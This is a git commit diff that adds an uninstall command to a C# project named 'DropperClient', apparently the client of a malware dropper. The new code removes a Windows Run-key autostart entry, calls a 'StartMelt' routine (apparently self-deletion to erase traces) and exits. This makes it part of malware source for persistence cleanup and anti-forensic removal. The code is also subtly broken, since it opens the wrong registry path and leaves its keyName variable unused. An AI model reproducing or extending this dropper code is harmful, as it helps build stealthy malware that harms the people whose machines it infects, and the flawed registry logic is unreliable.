2907ce75fa9a9f8059e2382bf16b06f0407306ad
Xqruciator <choeving+1@protonmail.com>
2019-09-27 23:10:18 +0200

    Created a uninstall function.

--- Client/Command/UninstallCommand.cs
+++ Client/Command/UninstallCommand.cs
@@ -3,16 +3,35 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using DropperClient.Installation;
+using Microsoft.Win32;
 
 namespace DropperClient.Command
 {
     internal class UninstallCommand : ICommand
     {
-        public string Parameters { get; }
-
         public bool Execute()
         {
-            throw new NotImplementedException();
+            var execInfo = new ExecutableInfo();
+
+            string keyName = @"Software\Microsoft\Windows\CurrentVersion\Run";
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(execInfo.AssemblyName, true))
+            {
+                if (key == null)
+                {
+                    // Key doesn't exist. Do whatever you want to handle
+                    // this case
+                }
+                else
+                {
+                    key.DeleteValue("MyApp");
+                }
+            }
+
+            execInfo.StartMelt();
+            Environment.Exit(0);
+
+            return true;
         }
     }
 }
